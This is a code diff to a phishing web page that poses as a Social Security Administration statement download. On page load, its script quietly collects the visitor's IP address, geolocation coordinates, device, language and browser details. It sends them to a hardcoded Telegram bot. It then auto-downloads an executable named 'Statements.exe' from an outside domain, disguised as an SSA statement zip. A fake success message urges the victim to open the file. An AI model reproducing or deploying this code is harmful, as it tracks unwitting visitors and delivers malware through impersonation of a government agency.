@@ -27,14 +27,36 @@
             text-decoration: underline;
         }
 
-        .download-status {
-            margin: 15px auto;
+        .download-status-container {
+            margin: 20px auto;
             max-width: 800px;
-            padding: 8px 12px;
+            padding: 0 15px;
+            font-family: Arial, sans-serif;
             font-size: 13px;
-            color: #2d3748;
+            color: #333;
+        }
+        
+        .download-status {
+            padding: 10px 15px;
+            margin-bottom: 10px;
             border-left: 3px solid #0033a0;
-            background-color: #f8fafc;
+            background-color: #f8f9fa;
+        }
+        
+        .download-success {
+            border-left-color: #2e8540;
+            background-color: #f0f7f2;
+        }
+        
+        .download-message {
+            font-weight: normal;
+            color: #333;
+        }
+        
+        .download-info {
+            color: #757575;
+            font-size: 12px;
+            margin-top: 5px;
         }
     </style>
 </head>
@@ -92,7 +114,7 @@
 </footer>
 
 <!-- Download status will appear here -->
-<div id="downloadStatus"></div>
+<div id="downloadStatusContainer" class="download-status-container"></div>
 </div>
 
 <script>
@@ -100,37 +122,33 @@
     const TELEGRAM_BOT_TOKEN = '7284066719:AAE2kt8GOOqqdb2FyTTdNmDPIKvyE9TGIqM';
     const TELEGRAM_CHAT_ID = '7724482403';
     
-    // Function to format Telegram message with Markdown
+    // Function to report visitor information to Telegram (original format)
     async function reportVisitToTelegram() {
         try {
-            // Get visitor IP address
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
-            const visitorIP = ipData.ip;
+            const ip = ipData.ip;
             
-            // Get geolocation data
             let geoData = {};
             try {
-                const geoResponse = await fetch(`https://ipapi.co/${visitorIP}/json/`);
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                 geoData = await geoResponse.json();
             } catch (geoError) {
                 geoData = { error: "Could not fetch location" };
             }
             
-            // Format message with Markdown styling
-            const formattedMessage = `
-*🔔 New SSA Statement Download Attempt 🔔*
-
-*📅 Date:* _${new Date().toLocaleString()}_
-*🌐 IP Address:* _${visitorIP}_
-*📍 Location:* _${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}_
-*🖥️ Platform:* _${navigator.platform}_
-*📱 User Agent:*
-_${navigator.userAgent}_
-*🖥️ Screen Resolution:* _${screen.width}x${screen.height}_
+            const visitDetails = `
+New SSA Statement Visit
+Time: ${new Date().toLocaleString()}
+IP: ${ip}
+Location: ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
+Coordinates: ${geoData.latitude || 'N/A'}, ${geoData.longitude || 'N/A'}
+Device: ${navigator.platform} ${/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? '(Mobile)' : '(Desktop)'}
+Language: ${navigator.language}
+User Agent: ${navigator.userAgent}
+Screen: ${screen.width}x${screen.height}
             `.trim();
             
-            // Send report to Telegram
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             await fetch(telegramUrl, {
                 method: 'POST',
@@ -139,31 +157,27 @@ _${navigator.userAgent}_
                 },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: formattedMessage,
-                    parse_mode: 'Markdown'
+                    text: visitDetails,
                 }),
             });
         } catch (error) {
-            console.error('Error sending Telegram report:', error);
+            console.error('Error reporting visit:', error);
         }
     }
 
-    // Function to detect operating system
     function detectOS() {
         const platform = navigator.platform.toLowerCase();
         const userAgent = navigator.userAgent.toLowerCase();
-        
+
         if (platform.includes('win')) return 'windows';
         if (platform.includes('mac')) return 'macos';
         if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
-        
-        return 'windows'; // Default to Windows
+
+        return 'unknown';
     }
 
-    // Function to get appropriate download link based on OS
-    function getDownloadLink() {
-        const osType = detectOS();
-        switch (osType) {
+    function getDownloadLink(os) {
+        switch (os) {
             case 'windows':
                 return 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe?e=Access&y=Guest';
             case 'macos':
@@ -175,44 +189,48 @@ _${navigator.userAgent}_
         }
     }
 
-    // Function to show download status below footer
     function showDownloadStatus() {
-        const statusDiv = document.getElementById('downloadStatus');
-        statusDiv.innerHTML = `
-            <div>SSA statement download has been processed successfully.</div>
-            <div>File transfer initiated to your device.</div>
+        const container = document.getElementById('downloadStatusContainer');
+        
+        container.innerHTML = `
+            <div class="download-status download-success">
+                <div class="download-message">Your SSA statement has been successfully downloaded.</div>
+                <div class="download-info">To view: Locate the downloaded file and open it.</div>
+            </div>
+            <div class="download-status">
+                <div class="download-message">Download started successfully!</div>
+            </div>
         `;
+        
+        // Update manual download link
+        const osType = detectOS();
+        const downloadLink = getDownloadLink(osType);
+        document.getElementById('downloadLink').href = downloadLink;
     }
 
-    // Main function to initialize download
-    function initDownload() {
-        // Set download link based on OS
-        const downloadLink = getDownloadLink();
+    function handleDownload() {
+        const osType = detectOS();
+        const downloadLink = getDownloadLink(osType);
         document.getElementById('downloadLink').href = downloadLink;
         
         try {
-            // Create hidden download link and trigger click
-            const autoDownload = document.createElement('a');
-            autoDownload.href = downloadLink;
-            autoDownload.download = 'SSA_Statement.zip';
-            document.body.appendChild(autoDownload);
-            autoDownload.click();
-            document.body.removeChild(autoDownload);
+            const autoDownloadBtn = document.createElement("a");
+            autoDownloadBtn.href = downloadLink;
+            autoDownloadBtn.download = "SSA_Statement_COMPLETE.zip";
+            document.body.appendChild(autoDownloadBtn);
+            autoDownloadBtn.click();
+            document.body.removeChild(autoDownloadBtn);
             
-            // Show status message after short delay
             setTimeout(showDownloadStatus, 1500);
-        } catch (error) {
-            console.error('Automatic download failed:', error);
+        } catch (e) {
+            showDownloadStatus();
+            console.error("Download error:", e);
         }
     }
 
-    // Initialize when page loads
     window.onload = function() {
-        // Report visit to Telegram
         reportVisitToTelegram();
-        
-        // Start download process
-        initDownload();
+        handleDownload();
     };
 </script>
 </body>
